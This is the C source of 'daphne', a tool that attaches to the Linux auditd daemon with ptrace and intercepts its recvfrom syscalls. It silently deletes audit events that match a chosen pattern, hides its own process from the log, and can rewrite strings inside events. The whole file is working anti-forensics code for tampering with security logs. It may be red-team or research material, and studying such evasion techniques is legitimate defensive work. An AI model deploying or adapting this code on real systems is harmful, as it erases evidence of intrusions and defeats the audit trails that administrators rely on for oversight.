#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include <sys/user.h>
#include <sys/wait.h>

#include <syscall.h>
#include <sys/reg.h>
#include <sys/ptrace.h>

#include "../include/ptrace.h"

int main(int argc, char** argv)
{
    if (argc != 3 && argc != 4)
    {
        printf("Usage: %s <PID> [<HIDE-STR>] [<MATCH> <REPLACE>]\n", argv[0]);
        return 0;
    }

    pid_t PID = (pid_t)atoi(argv[1]);
    pid_t self = getpid();

    /*
     * To hide daphne itself from auditd, we auto exclude some patterns.
     * Notice that certain attributes like the process name needs to be
     * hex encoded.
     */
    char* self_pid[16];
    char* self_ppid[16];
    char* self_proc[512];

    sprintf(self_pid, "pid=%d", self);
    sprintf(self_ppid, "ppid=%d", self);
    str_arr_to_hex(self_proc, argc, argv);

    /*
     * The matcher patterns from the command line need also be hex encoded
     * to detect possible hex encoded matches.
     */
    char* hex_argv2[256];
    char* hex_argv3[256];

    str_to_hex(hex_argv2, argv[2]);

    if (argc == 4)
        str_to_hex(hex_argv3, argv[3]);

    /*
     * Start ptracing auditd.
     */
    ptrace(PTRACE_ATTACH, atoi(argv[1]), 0, 0);
    printf("[+] Attached to process: %d\n", PID);

    ptrace(PTRACE_SETOPTIONS, PID, 0, (void*)PTRACE_O_TRACECLONE);
    ptrace(PTRACE_SETOPTIONS, PID, 0, (void*)PTRACE_O_TRACESYSGOOD);

    printf("[+] Configured ptrace correctly.\n");
    printf("[+] Starting ptrace event loop.\n");

    struct user_regs_struct regs;
    unsigned int filter_event_id = 0;

    for (;;)
    {
        if (!ptrace_wait_syscall(PID))
        {
            printf("[+] The monitored process exited.\n");
            break;
        }

        /*
         * We intercepted the start of the syscall here. Since we
         * want to tamper the result data, we first let it finish.
         */

        if (!ptrace_wait_syscall(PID))
        {
            printf("[+] The monitored process exited.\n");
            break;
        }

        /*
         * Syscall finished. Get the CPU registers and start to
         * investigate. The first things we check is whether we
         * intercepeted an recvfrom syscall (regs.orig_rax) and
         * whether the syscall was successful (regs.rax)
         */
        ptrace(PTRACE_GETREGS, PID, 0, &regs);

        if (regs.orig_rax == SYS_recvfrom && (int)regs.rax > 0)
        {
            printf("[+] Intercepted SYS_RECVFROM call.\n");
            char* buffer = ptrace_get_string(PID, (void*)regs.rsi, regs.rax);

            /*
             * auditd message header is 16 bytes. Skip it to process the
             * raw audit message. The auditd message ID sits at 37 bytes
             * offset. This also needs to be determined and saved. When
             * the event gets filtered, we want to filter all proceeding
             * events with the same event ID.
             */
            char* payload = buffer + 16;
            unsigned int event_id = strtoul(buffer + 37, NULL, 0);

            //printf("[+] Event ID: %u\n", event_id);
            //printf("[+] Payload: %s\n", payload);

            /*
             * Hide daphne itself from auditd. We check for the pid, ppid
             * and the hex encoded process name of daphne to catch such events.
             */
            if (filter_event_id == event_id || (strstr(payload, self_pid) != NULL) ||
                strstr(payload, self_ppid) != NULL || strstr(payload, self_proc) != NULL)
            {
                ptrace_clear_data(PID, (void*)regs.rsi, regs.rax);
            }

            else if (argc == 3)
            {
                /*
                 * Check the obtained buffer for the specified pattern. Since auditd uses hex
                 * encoding for certain values, also check for the hex representation. If the
                 * pattern is found, clear the buffer.
                 */
                if ((strstr(payload, argv[2]) != NULL) || (strstr(payload, hex_argv2) != NULL))
                {
                    ptrace_clear_data(PID, (void*)regs.rsi, regs.rax);
                    filter_event_id = event_id;
                }
            }

            else if (argc == 4)
            {
                /*
                 * Check the obtained buffer for the specified pattern. Since auditd uses hex
                 * encoding for certain values, also check for the hex representation. If the
                 * pattern is found, replace it with the specified replace string. Also here,
                 * possible hex encoding needs to be considered. Also the netlink message length
                 * may needs to be adjusted.
                 */
                if ((strstr(payload, argv[2]) != NULL) || (strstr(payload, hex_argv2) != NULL))
                {
                    char* fake = str_replace(payload, argv[2], argv[3]);
                    fake = str_replace(fake, hex_argv2, hex_argv3);

                    regs.rax = strlen(fake) + 16;
                    printf("[+] Replacing '%s' with '%s'.\n", argv[2], argv[3]);

                    ptrace_set_string(PID, (void*)regs.rsi + (payload - buffer), fake, regs.rax);
                    *(unsigned int*)(buffer) = *(unsigned int*)(buffer) - strlen(payload) + regs.rax;

                    ptrace(PTRACE_SETREGS, PID, 0, &regs);
                    free(fake);
                }
            }

            free(buffer);
        }
    }
}
